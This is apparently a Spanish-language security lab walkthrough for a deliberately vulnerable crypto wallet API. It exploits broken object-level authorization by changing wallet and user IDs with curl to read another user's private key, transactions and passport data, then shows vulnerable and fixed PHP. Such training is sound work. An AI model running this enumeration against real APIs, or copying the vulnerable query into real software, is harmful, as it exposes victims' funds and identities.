# LAB 01 - Broken Object Level Authorization (BOLA)

## Referencia OWASP: API1:2023 - Broken Object Level Authorization

---

## Objetivo

Explotar la falta de verificacion de propiedad de objetos en la API de CryptoVulnX para acceder a wallets, balances, claves privadas e historial de transacciones de otros usuarios sin autorizacion.

---

## Contexto

La vulnerabilidad BOLA (Broken Object Level Authorization) ocurre cuando una API expone endpoints que manejan identificadores de objetos (IDs) y no verifica que el usuario autenticado sea el propietario legitimo del objeto solicitado.

En CryptoVulnX, la API recibe parametros como `wallet_id` y `user_id` directamente del cliente y los utiliza en consultas SQL sin validar que pertenezcan al usuario autenticado. Esto permite que cualquier usuario autenticado acceda a la informacion financiera de otros usuarios simplemente modificando el valor del identificador en la peticion.

Este tipo de vulnerabilidad es extremadamente critica en plataformas fintech, ya que permite:
- Ver balances de wallets ajenas
- Obtener claves privadas de otros usuarios
- Consultar el historial completo de transacciones de cualquier cuenta
- Obtener el estado KYC de otros usuarios

---

## Endpoints Involucrados

| Metodo | Endpoint | Descripcion |
|--------|----------|-------------|
| `GET` | `/api/v1/wallets/balance.php?wallet_id=X` | Consulta el balance de una wallet por su ID |
| `GET` | `/api/v1/wallets/history.php?wallet_id=X` | Obtiene el historial de transacciones de una wallet |
| `GET` | `/api/v1/kyc/status.php?user_id=X` | Consulta el estado de verificacion KYC de un usuario |

---

## Dificultad

**Baja** - Solo requiere modificar un parametro en la URL para explotar la vulnerabilidad.

---

## Pistas

### Pista 1 - Reconocimiento
Inicia sesion con tus credenciales y observa las peticiones que realiza la aplicacion. Presta atencion a los parametros numericos en las URLs, especialmente `wallet_id` y `user_id`. ¿Que pasa si cambias esos valores?

### Pista 2 - Enumeracion
Tu wallet tiene `wallet_id=3`. Los IDs son secuenciales. El administrador del sistema suele ser el primer usuario registrado. ¿Cual seria el `wallet_id` del administrador?

### Pista 3 - Explotacion
Realiza peticiones GET a los endpoints de balance e historial cambiando `wallet_id=3` por `wallet_id=1`. La API devolvera toda la informacion de la wallet del administrador, incluyendo su `private_key` y su balance completo, sin verificar que seas el propietario.

---

## Solucion

### Paso 1 - Autenticarse como el usuario carlos

```bash
curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \
  -H "Content-Type: application/json" \
  -d '{"username":"carlos","password":"carlos2024"}'
```

Respuesta esperada:
```json
{
  "status": "success",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user_id": 3
}
```

### Paso 2 - Consultar la wallet propia (wallet_id=3)

```bash
curl -s -X GET "http://localhost/appsec/api/v1/wallets/balance.php?wallet_id=3" \
  -H "Authorization: Bearer <TOKEN_OBTENIDO>"
```

Respuesta esperada:
```json
{
  "wallet_id": 3,
  "user_id": 3,
  "balance": "0.05000000",
  "currency": "BTC",
  "address": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
}
```

### Paso 3 - Explotar BOLA: Acceder a la wallet del administrador (wallet_id=1)

```bash
curl -s -X GET "http://localhost/appsec/api/v1/wallets/balance.php?wallet_id=1" \
  -H "Authorization: Bearer <TOKEN_OBTENIDO>"
```

Respuesta esperada:
```json
{
  "wallet_id": 1,
  "user_id": 1,
  "balance": "150.75000000",
  "currency": "BTC",
  "address": "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
  "private_key": "5HueCGU8rMjxEXxiPuD5BDku4MkFqeZyd4dZ1jvhTVqvbTLvyTJ"
}
```

**La API devuelve la clave privada y el balance completo del administrador.**

### Paso 4 - Acceder al historial de transacciones del administrador

```bash
curl -s -X GET "http://localhost/appsec/api/v1/wallets/history.php?wallet_id=1" \
  -H "Authorization: Bearer <TOKEN_OBTENIDO>"
```

Respuesta esperada:
```json
{
  "wallet_id": 1,
  "transactions": [
    {
      "id": 1,
      "type": "deposit",
      "amount": "200.00000000",
      "date": "2024-01-15T10:30:00Z"
    },
    {
      "id": 2,
      "type": "withdrawal",
      "amount": "49.25000000",
      "destination": "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy",
      "date": "2024-02-20T14:22:00Z"
    }
  ]
}
```

### Paso 5 - Acceder al estado KYC de otro usuario

```bash
curl -s -X GET "http://localhost/appsec/api/v1/kyc/status.php?user_id=1" \
  -H "Authorization: Bearer <TOKEN_OBTENIDO>"
```

Respuesta esperada:
```json
{
  "user_id": 1,
  "kyc_status": "verified",
  "full_name": "Admin CryptoVulnX",
  "document_type": "passport",
  "document_number": "AB1234567"
}
```

---

## Remediacion

### Codigo Vulnerable

```php
// balance.php - VULNERABLE
$wallet_id = $_GET['wallet_id'];
$query = "SELECT * FROM wallets WHERE id = $wallet_id";
$result = $conn->query($query);
```

### Codigo Corregido

```php
// balance.php - SEGURO
$wallet_id = $_GET['wallet_id'];
$authenticated_user_id = getAuthenticatedUserId($token);

// Agregar WHERE user_id para verificar propiedad del objeto
$stmt = $conn->prepare("SELECT id, balance, currency, address FROM wallets WHERE id = ? AND user_id = ?");
$stmt->bind_param("ii", $wallet_id, $authenticated_user_id);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows === 0) {
    http_response_code(403);
    echo json_encode(["error" => "No tienes permiso para acceder a esta wallet"]);
    exit;
}

// IMPORTANTE: No exponer private_key en la respuesta
$row = $result->fetch_assoc();
unset($row['private_key']);
echo json_encode($row);
```

### Principios de Remediacion

1. **Verificar propiedad del objeto**: Siempre agregar `WHERE user_id = $authenticated_user_id` en las consultas que acceden a recursos por ID.
2. **Obtener el user_id del token del servidor**: Nunca confiar en un `user_id` enviado por el cliente.
3. **Filtrar campos sensibles**: Nunca exponer `private_key` u otros datos criticos en las respuestas de la API.
4. **Usar UUIDs**: Reemplazar IDs secuenciales por UUIDs para dificultar la enumeracion de objetos.
5. **Implementar middleware de autorizacion**: Centralizar la logica de verificacion de propiedad en un middleware reutilizable.
